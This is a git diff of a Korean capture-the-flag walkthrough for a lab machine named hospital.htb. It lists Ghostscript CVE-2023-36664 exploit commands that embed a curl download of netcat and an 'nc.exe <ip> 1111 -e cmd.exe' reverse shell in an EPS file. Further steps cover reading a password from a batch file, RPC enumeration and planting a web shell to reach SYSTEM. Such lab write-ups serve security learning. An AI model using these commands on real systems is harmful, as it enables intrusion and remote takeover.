@@ -5,7 +5,7 @@
   - 443:webmail(roundcube)
   - 8080:login, upload
   - RPC
-<br></br>
+<br>
 - 파일 업로드 부분이 있어서 웹쉘 업로드를 시도하였지만 거부당함
   ![upload](https://github.com/murphy701/security/assets/50907298/6b5fc513-7e63-4d9e-908f-e14b8dd67c86)
 
@@ -50,6 +50,32 @@
   - python3 -m http.server 8001
     - 주의 사항으로 파이썬 웹 서버 명령 실행 시 경로를 /var/www/html에서 실행해야 함
   - python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.24:8001/nc64.exe -o nc.exe" --filename file.eps
-    - 해당 명령으로 curl 뒤의 명령을 파일에 삽입
+    - 해당 명령으로 file.eps에 페이로드를 삽입
 - 이후 메일에 file.eps파일을 첨부하여 보내면 해당 서버에 nc64.exe를 다운로드 시킴
-- python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.16.24 1111 -e cmd.exe" --filename file.eps
+<br></br>
+- nc64.exe를 다운로드 시킨 상태에서 해당 명령으로 리버스 쉘을 얻는 파일을 다시 만든다
+- python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe <ip> 1111 -e cmd.exe" --filename file.eps
+  - nc -lnvp 1111로 연결을 기다리고 메시지에 새로운 file.eps를 보내면 리버스 쉘을 획득할 수 있다.
+- 이후에 Desktop에서 type user.txt를 이용하여 플래그 값을 출력한다
+  <br></br>
+### 권한 상승
+- documents에서 ghostscript.bat에서 pw를 찾을 수 있다.
+  - type ghostscript.bat
+- 해당 pw를 이용하여 rpc연결을 시도한다.
+  - drwilliams와 찾은 pw를 이용
+  - rpcclient -U "drbrown" hospital.htb
+### querydispinfo 실행
+![querydispinfo](https://github.com/murphy701/security/assets/50907298/5efc379f-077f-466c-abc5-3d7abecc44ab)
+- desc 부분에 admin과 guest가 built-in account for ~ the computer/domain이 설명 되어 있음
+  - 어드민 정보와 게스트 정보가 같은 도메인에 공유 되어 있음
+    - 윈도우에서 흔한 것으로 같은 도메인에서 관리됨
+    - 같은 pc에 존재하는 것으로 추정
+<br></br>
+- 기존에 리버스 쉘로 연결 되어 있던 클라이언트 pc에서 C:\xampp\htdocs에 powny 웹쉘을 업로드
+  - curl <ip>:8001/exploit.php -o shell.php
+- https://hospital.htb/shell.php로 접속 시 쉘을 얻을 수 있음
+  - whoami 실행 시 nt authority\system 결과가 출력되며 권한 상승을 시킨 것을 알 수 있음
+- C:\Users\Administrator 에서 root.txt를 읽을 수 있게 됨
+<br></br>
+### 알게 된 점
+- 파이썬으로 웹 서버 실행하여 파일을 다운로드 하게 할 때 /var/www/html에서 python3 -m http.server를 실행해야 정상적으로 작동한다.
